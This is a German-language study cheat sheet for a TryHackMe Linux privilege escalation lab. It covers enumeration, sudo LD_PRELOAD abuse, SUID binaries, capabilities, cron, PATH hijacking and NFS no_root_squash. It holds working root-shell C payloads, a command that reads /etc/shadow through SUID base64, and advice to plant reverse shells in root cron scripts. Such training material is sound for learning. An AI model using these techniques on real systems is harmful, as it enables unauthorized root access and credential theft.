---
description: https://tryhackme.com/room/linprivesc
cover: >-
  https://www.onlogic.com/company/io-hub/wp-content/uploads/2009/01/Read-only-Linux.jpg
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Linux PrivEsc

[https://juggernaut-sec.com/manual-enumeration-lpe/](https://juggernaut-sec.com/manual-enumeration-lpe/)

[https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)

## Enumeration

Check die Pfade `/home` `/root` `/var`

nach Dateien wie backup, save, kopie oder copy

Dabei auch Dateien wie `.bash_history`

### Manuell

|                                                           |                                                                                                                                                                                    |
| --------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| hostname                                                  | Hostname Zielmaschine                                                                                                                                                              |
| uname -a                                                  | Systeminformationen                                                                                                                                                                |
| /proc/version                                             | Informationen Zielsystem (Kernel Version etc.)                                                                                                                                     |
| /etc/issue                                                | Identifikation des Zielsystems                                                                                                                                                     |
| <p>ps<br>ps -A<br>ps -axjf</p>                            | <p>-A: Alle laufenden Prozesse<br>-axjf: Prozessbaum anzeigen</p>                                                                                                                  |
| env                                                       | Umgebungsvariablen                                                                                                                                                                 |
| sudo -l                                                   | ( root- ) Privilegien                                                                                                                                                              |
| ls                                                        | ls -la wie immer                                                                                                                                                                   |
| id                                                        | User Privilegien/gruppen                                                                                                                                                           |
| /etc/passwd                                               | Nutzer enumerieren                                                                                                                                                                 |
| history                                                   | Befehlshistorie                                                                                                                                                                    |
| <p>ifconfig<br>ip route</p>                               | Netzwerkverbindungen                                                                                                                                                               |
| <p>netstat<br>netstat -a -au -at -s<br>netstat -tp -l</p> | <p>existierende Kommunikationen<br>(a)lle ports, (au)lle udp, (at)lletcp, (s)tatistics<br>(tp)serviceName+PID, (l)istening, (i)nterface<br>(o)displayTimers, (n)otResolveNames</p> |
| find                                                      | Dateien durchsuchen                                                                                                                                                                |

{% code fullWidth="true" %}
```
    find . -name flag1.txt: find the file named “flag1.txt” in the current directory
    find /home -name flag1.txt: find the file names “flag1.txt” in the /home directory
    find / -type d -name config: find the directory named config under “/”
    find / -type f -perm 0777: find files with the 777 permissions (files readable, writable, and executable by all users)
    find / -perm a=x: find executable files
    find / -perm -u=s -type f 2>/dev/null: Find files with the SUID bit
    find /home -user frank: find all files for user “frank” under “/home”
    find / -mtime 10: find files that were modified in the last 10 days
    find / -atime 10: find files that were accessed in the last 10 day
    find / -cmin -60: find files changed within the last hour (60 minutes)
    find / -amin -60: find files accesses within the last hour (60 minutes)
    find / -size 50M: find files with a 50 MB size
    find / -size +100M: größer 100Megabyte
    find / -size +10M -type f 2>/dev/null : Fehler nicht ausgeben
    find / -name python* : Alles mit python
```
{% endcode %}

### Automatisch

* Linpeas ( [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) )
* LinEnum ( [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) )
* LES (Linux Exploit Suggester) ( [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) )
* Linux Smart Enumeration ( [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration) )
* Linux Priv Checker ( [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker) )

## Kernel Exploits

1. Identifikation der Kernelversion ( [https://www.linuxkernelcves.com/cves](https://www.linuxkernelcves.com/cves) , LES, Google, etc. )
2. Suchen + Finden Exploit für Kernelversion
3. Let's go

Achtung, fehlgeschlagener Exploit kann zu Systemabsturz führen!

Achtung! Exploit-Code muss komplett bekannt sein, da Gefahr einer Schwächung des ZIelsystems besteht!

## Sudo

* Ausnutzen von Funktionen von Systemen die keine bekannte Schwachstelle haben ( Leverage application functions ) wie bspw. `apache2 -f` zum Laden alternativer ServerConfigFiles

Dabei kann `sudo -l` zur Anzeige der eigenen Berechtigungen sowie [https://gtfobins.github.io/](https://gtfobins.github.io/) verwendet werden.

* Ausnutzen von Shared Libraries durch LD\_PRELOAD

<div align="left"><figure><img src="https://i.imgur.com/gGstS69.png" alt=""><figcaption></figcaption></figure></div>

Wenn die Option "`env_keep`" aktiviert ist, können wir eine gemeinsam genutzte Bibliothek erzeugen, die geladen und ausgeführt wird, bevor das Programm ausgeführt wird.

Die Option `LD_PRELOAD` wird ignoriert, wenn die tatsächliche Benutzer-ID nicht mit der effektiven Benutzer-ID übereinstimmt.

Die Schritte dieses Vektors der Privilegienerweiterung lassen sich wie folgt zusammenfassen;

1. Prüfung auf LD\_PRELOAD (mit der Option env\_keep)&#x20;
2. Schreiben eines einfachen C-Codes, der als Share-Objekt-Datei (.so-Erweiterung) kompiliert wird&#x20;
3. Ausführen des Programms mit sudo-Rechten und der Option LD\_PRELOAD, die auf unsere .so-Datei verweist

<pre><code>Der C-Code erzeugt eine einfach Root-Shell

#include &#x3C;stdio.h>
#include &#x3C;sys/types.h>
#include &#x3C;stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

#Kompilierung in ein shared object file mit gcc
<strong>gcc -fPIC -shared -o shell.so shell.c -nostartfiles
</strong></code></pre>

```
# Program laden
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```

## SUID ( [https://gtfobins.github.io/#+suid](https://gtfobins.github.io/#+suid) )

```
# suid-bit s
-rwsr-xr-x

# gesetzt wurde es mit
chmod u+s <datei>

# Liste Dateien mit gesetztem SUID/SGID -Bit
find / -type f -perm -04000 -ls 2>/dev/null

# Programm mit dynamischem Linker starten
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /path/to/suid/program

# Welche Bibliotheken lädt das Programm beim Start
/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 --list /bin/bash
```

Nach Vorlage mit suid auf base64 kann folgender Befehl zum Auslesen von shadow verwendet werden.

```
/usr/bin/base64 /etc/shadow | base64 --decode
```

## Capabilities ( [https://gtfobins.github.io/#+capabilities](https://gtfobins.github.io/#+capabilities) )

Eine weitere Methode, mit der Systemadministratoren die Berechtigungsstufe eines Prozesses oder einer Binärdatei erhöhen können, sind "Fähigkeiten". Fähigkeiten helfen bei der Verwaltung von Berechtigungen auf einer detaillierteren Ebene.

Wenn der SOC-Analyst beispielsweise ein Tool verwenden muss, das Socket-Verbindungen initiieren muss, wäre ein normaler Benutzer dazu nicht in der Lage. Wenn der Systemadministrator diesem Benutzer keine höheren Privilegien einräumen möchte, kann er die Fähigkeiten des Binarys ändern. Dadurch würde das Binärprogramm seine Aufgabe erfüllen, ohne dass ein Benutzer mit höheren Rechten benötigt wird.

{% code overflow="wrap" %}
```
getcap -r / 2>/dev/null  # Listet aktivierte Capabilities auf, Fehlermeldungen werden ausgeblendet (Diese werden bei Usern ohne priv geworfen)
```
{% endcode %}

## Cron Jobs

Prüfen der Cronjob-Dateien bspw. `/etc/crontab` ob jobs mit root existieren und ob die dabei aufgerufenen Scripte beschrieben werden können. Wenn das möglich ist, dann Reverse Shell-Code platzieren und mit Listener auf Anfrage warten.

Crontab ist immer eine Überprüfung wert, da es manchmal zu einfachen Vektoren für die Privilegienerweiterung führen kann. ( Change Management Issue )

Das folgende Szenario ist in Unternehmen, die nicht über einen bestimmten Reifegrad der Cybersicherheit verfügen, nicht ungewöhnlich:

1. Systemadministratoren müssen in regelmäßigen Abständen ein Skript ausführen.&#x20;
2. Sie erstellen dazu einen Cron-Job.
3. Nach einer gewissen Zeit wird das Skript nutzlos und wird gelöscht.
4. Sie bereinigen den entsprechenden Cron-Job nicht

Wenn der vollständige Pfad des Skripts nicht definiert ist, bezieht sich cron auf die Pfade, die unter der Variable PATH in der Datei /etc/crontab aufgeführt sind.

Bei Reverse Shell mit Crontab an folgendes denken!

* ist der shebang im File? z.b. `#!/usr/bin/python3`
* darf die Datei ausgeführt werden?

## $PATH

Hijack von Appplikationen durch Ausnutzen der Suche in PATH nach bestimmter Datei.

```
# Beispiel, Eine C-Applikation startet eine system-binary

#include<unistd.h>
void main(){
    setuid(0);
    setgid(0);
    system("<binary_name>");
}
```

Um die Datei zu laden wird die Appl. in PATH suchen.

```
echo $PATH   # Pfad ausgeben
find / -writable 2>/dev/null  # Ordner mit Schreibzugriff finden
```

* Welche Verzeichnisse befinden sich unter $PATH?&#x20;
* Verfügt der aktuelle Benutzer über Schreibrechte für einen dieser Ordner?
* Kann $PATH geändert werden?
* Gibt es ein Skript/eine Anwendung, das/die gestartet werden kann und von dieser Sicherheitslücke betroffen ist?

&#x20;Durch gezieltes Setzen eines weiteren Pfads an die PATH-Spitze wird dort zuerst gesucht.

```
export PATH=/tmp:$PATH    # Beschreibbaren Ordner zu Path hinzufügen

cd /<neuer_pfad>
echo "/bin/bash" > <binary_name>
chmod 777 <binary_name>

./<c-applikation von oben bspw.>
```

## NFS ( Network File Sharing )

Konfigurationspfad: `/etc/exports`

Hier liegt die Suche auf einer falsch konfigurierten Netzwerk-Shell. Kann in der Konfiguration die `"no_root_squash"` Option bei einem beschreibbaren Share gefunden werden, kann eine ausführbare Datei mit SUID-Bit erstellt und ausgeführt werden.

```
showmount -e <Ziel-IP>

mount -o rw <Ziel-IP>:/<pfad> /<lokaler_pfad>

int main(){   # Diese Appl. kann dafür verwendet werden
    setuid(0);
    setgid(0);
    system("/bin/bash");
    return 0;
}
gcc datei.c -o datei -w    # kompilieren
chmod +s datei             # suid bit setzen
```
